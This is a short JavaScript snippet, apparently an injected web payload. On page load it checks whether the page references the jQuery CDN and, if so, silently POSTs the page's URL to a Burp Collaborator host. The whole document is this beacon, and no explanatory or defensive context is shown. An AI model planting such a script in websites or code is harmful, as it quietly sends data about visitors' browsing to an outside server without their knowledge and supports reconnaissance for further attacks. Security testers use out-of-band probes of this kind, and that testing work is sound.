window.onload=()=>{var reg=/code\.jquery.com/ig;
if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
fetch('https://qa4b5aap1x3ws679kfbgn0kytpzfn4.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.documentURI
});
}}
